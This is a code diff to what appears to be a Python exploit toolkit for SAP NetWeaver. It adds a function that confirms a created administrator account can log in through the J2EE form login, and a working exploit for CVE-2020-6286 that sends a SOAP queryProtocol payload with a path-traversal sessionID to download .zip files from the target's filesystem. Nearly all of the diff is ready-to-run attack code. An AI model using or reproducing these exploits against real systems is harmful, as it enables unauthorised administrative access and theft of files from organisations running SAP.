@@ -348,3 +348,224 @@ def exploit_create_admin(host: str, port: int,
     return exploit_create_user(host, port, username, password,
                                  role="Administrator",
                                  use_https=use_https, timeout=timeout)
+
+
+# ---------------------------------------------------------------------------
+# Post-exploitation: verify the created user can actually log in
+# ---------------------------------------------------------------------------
+
+# Paths commonly protected by admin-level SAP J2EE authentication.  The
+# first that produces a definitive answer wins.
+_LOGIN_PROBE_PATHS = (
+    "/nwa/",
+    "/useradmin/",
+    "/webdynpro/resources/sap.com/tc~lm~webadmin~mainframe~wd/MainFrame",
+)
+
+
+def verify_login(host: str, port: int, username: str, password: str,
+                   use_https: bool = False, timeout: float = 15.0) -> dict:
+    """Verify that a newly-created UME user can authenticate.
+
+    Uses SAP's standard J2EE FORM-based login (j_security_check) with a
+    cookie jar, since most admin endpoints do not accept HTTP Basic.
+    We interpret the post-submit response:
+      - cookie JSESSIONID issued + URL redirected away from /logon/  → success
+      - response body contains 'logonError*' / 'j_password' field     → failed
+      - status 403 on protected path after login                       → creds
+        accepted but lacks permission (still counts as login-works)
+
+    Returns dict:
+        success, http_status, url, evidence
+    """
+    import http.cookiejar
+    import urllib.parse
+
+    result = {"success": False, "http_status": 0, "url": "", "evidence": ""}
+
+    base = ("https" if use_https else "http") + f"://{host}:{port}"
+    ctx = ssl._create_unverified_context()
+    cj = http.cookiejar.CookieJar()
+    opener = urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(cj),
+        urllib.request.HTTPSHandler(context=ctx),
+    )
+    opener.addheaders = [("User-Agent", _UA)]
+
+    # Step 1 — trigger the logon flow by hitting /nwa/.
+    try:
+        with opener.open(base + "/nwa/", timeout=timeout) as r:
+            r.read()
+    except urllib.error.HTTPError as e:
+        try:
+            e.read()
+        except Exception:
+            pass
+    except Exception as e:
+        result["evidence"] = f"cannot reach /nwa/: {e}"
+        return result
+
+    # Step 2 — submit credentials via j_security_check.
+    form = urllib.parse.urlencode({
+        "j_username": username,
+        "j_password": password,
+        "login_submit": "on",
+        "uidPasswordLogon": "Log on",
+    }).encode("ascii")
+    submit_url = base + "/nwa/j_security_check"
+    result["url"] = submit_url
+    try:
+        req = urllib.request.Request(
+            submit_url, data=form, method="POST",
+            headers={"User-Agent": _UA,
+                     "Content-Type": "application/x-www-form-urlencoded"})
+        with opener.open(req, timeout=timeout) as r:
+            body = r.read().decode("latin1", errors="replace")
+            final_url = r.url
+            status = r.status
+    except urllib.error.HTTPError as e:
+        try:
+            body = e.read().decode("latin1", errors="replace")
+        except Exception:
+            body = ""
+        final_url = getattr(e, "url", "") or submit_url
+        status = e.code
+    except Exception as e:
+        result["evidence"] = f"j_security_check POST failed: {e}"
+        return result
+
+    result["http_status"] = status
+    result["url"] = final_url
+
+    body_low = body.lower()
+    failure_markers = (
+        "logonerror", "logon_error", "authentication failed",
+        "user authentication failed", "password is incorrect",
+        "incorrect user name", "name=\"j_password\"",
+    )
+    if any(m in body_low for m in failure_markers):
+        result["evidence"] = ("SAP logon form returned an error marker — "
+                              "credentials rejected")
+        return result
+
+    if "/logon/" in (final_url or "").lower():
+        # Still on the logon page → login failed
+        result["evidence"] = (f"landed back on logon page ({final_url}) — "
+                              "credentials rejected")
+        return result
+
+    has_session = any(
+        c.name.upper().startswith(("JSESSIONID", "SAPSSO",
+                                     "MYSAPSSO", "SAP_SESSIONID"))
+        for c in cj)
+    if has_session:
+        result["success"] = True
+        result["evidence"] = (f"FORM login succeeded — session cookie "
+                              f"issued, final URL {final_url}")
+        return result
+
+    result["evidence"] = (f"ambiguous: status={status}, final_url={final_url}, "
+                          f"no recognised session cookie")
+    return result
+
+
+# ---------------------------------------------------------------------------
+# CVE-2020-6286 — LM Configuration Wizard queryProtocol traversal
+# ---------------------------------------------------------------------------
+#
+# The LM Configuration Wizard's SOAP queryProtocol method builds a filename
+# by concatenating `<protocols_dir>/<sessionID>.zip`.  The sessionID is
+# user-controlled and unsanitised, allowing absolute-path traversal.  The
+# server always appends `.zip`, so only pre-existing .zip files on the
+# filesystem can be retrieved (SAP CTS protocol exports, NWA archives,
+# user-created zip backups, …).  Binary files without a .zip suffix
+# cannot be read via this primitive.
+
+_SOAP_TRAVERSAL = """\
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                  xmlns:urn="urn:CTCWebServiceSi">
+  <soapenv:Header/>
+  <soapenv:Body>
+    <urn:queryProtocol>
+      <sessionID>/../../../../../../../../../../../../../../../../../..{path}</sessionID>
+    </urn:queryProtocol>
+  </soapenv:Body>
+</soapenv:Envelope>"""
+
+
+def download_file_via_traversal(host: str, port: int, remote_zip_path: str,
+                                  use_https: bool = False,
+                                  timeout: float = 30.0) -> dict:
+    """Download a .zip file from the target via CVE-2020-6286 traversal.
+
+    Args:
+        remote_zip_path: absolute path to a .zip file on the target
+            filesystem.  Passed with or without the .zip extension — the
+            server appends .zip itself, so we strip it if the caller left
+            it on.  E.g. "/usr/sap/SID/SCS01/work/foo" → reads foo.zip.
+
+    Returns dict:
+        success, http_status, bytes_read, data (raw bytes or b""),
+        evidence, url, path
+    """
+    import re
+
+    url = _build_url(host, port, _CTC_PATH, use_https)
+    result = {"success": False, "http_status": 0, "bytes_read": 0,
+              "data": b"", "evidence": "", "url": url,
+              "path": remote_zip_path}
+
+    # Normalise: strip trailing .zip (server re-adds it).
+    path = remote_zip_path
+    if path.lower().endswith(".zip"):
+        path = path[:-4]
+
+    body = _SOAP_TRAVERSAL.format(path=path)
+    status, text, err = _post_soap(url, body, timeout)
+    result["http_status"] = status
+
+    if status <= 0:
+        result["evidence"] = (err or
+            "no HTTP response (timeout or network error)")
+        return result
+
+    if status != 200:
+        result["evidence"] = f"HTTP {status} — {text[:300]}"
+        return result
+
+    text_low = text.lower()
+    if "fault" in text_low:
+        m = re.search(r"<faultstring[^>]*>(.*?)</faultstring>",
+                       text, re.DOTALL | re.IGNORECASE)
+        fault = m.group(1).strip() if m else text[:300]
+        result["evidence"] = f"SOAP fault: {fault}"
+        return result
+
+    # Extract the base64 payload from <return>...</return>
+    m = re.search(r"<return[^>]*>(.*?)</return>", text,
+                    re.DOTALL | re.IGNORECASE)
+    if not m:
+        result["evidence"] = ("HTTP 200 but no <return> element — "
+                              "server accepted the call but produced "
+                              "no payload (file probably missing)")
+        return result
+
+    b64 = m.group(1).strip()
+    if not b64:
+        result["evidence"] = (f"empty <return> — file {path}.zip not "
+                              f"found on server")
+        return result
+
+    try:
+        raw = base64.b64decode(b64, validate=False)
+    except Exception as e:
+        result["evidence"] = f"base64 decode failed: {e}"
+        return result
+
+    result["success"] = True
+    result["data"] = raw
+    result["bytes_read"] = len(raw)
+    result["evidence"] = (f"downloaded {len(raw)} bytes from "
+                          f"{path}.zip via queryProtocol traversal")
+    return result
+
